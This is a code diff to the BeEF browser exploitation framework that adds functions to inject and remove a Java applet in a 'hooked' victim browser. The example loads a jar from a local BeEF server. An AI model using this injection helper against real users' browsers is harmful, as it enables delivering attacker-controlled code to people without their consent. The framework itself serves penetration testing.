@@ -148,7 +148,40 @@ beef.dom = {
 				$j(this).attr('href', url).click(function() { return true; });
 			}
 		}).length;
-	}
+	},
+
+    /**
+     * @params: {String} id: reference identifier to the applet.
+     * @params: {String} code: name of the class to be loaded. For example, beef.class.
+     * @params: {String} archive: the jar that contains the code.
+     * example usage in code:
+     * beef.dom.attachApplet('appletId', 'SuperMario3D.class', 'http://127.0.0.1:3000/ui/public/images/target.jar');
+     */
+    attachApplet: function(id, code, archive){
+        var content = null;
+        if(beef.browser.isIE()){
+           content = "" +
+               "<object classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
+                    "height='350' width='550' > " +
+                        "<param name='code' value='" + code + "' />" +
+                        "<param name='archive' value='" + archive + "' />" +
+                "</object>";
+        }else{ // if the hooked browser is not IE, then use the embed tag
+             content = "" +
+                "<embed id='" + id + "' code='" + code + "' " +
+                    "type='application/x-java-applet' archive='" + archive + "' " +
+                    "height='350' width='550' >" +
+                "</embed>";
+        }
+        $j('body').append(content);
+    },
+
+    /**
+     * @params: {String} id: reference identifier to the applet.
+     */
+    detachApplet: function(id){
+       $j('#' + id + '').detach();
+    }
 	
 };
 
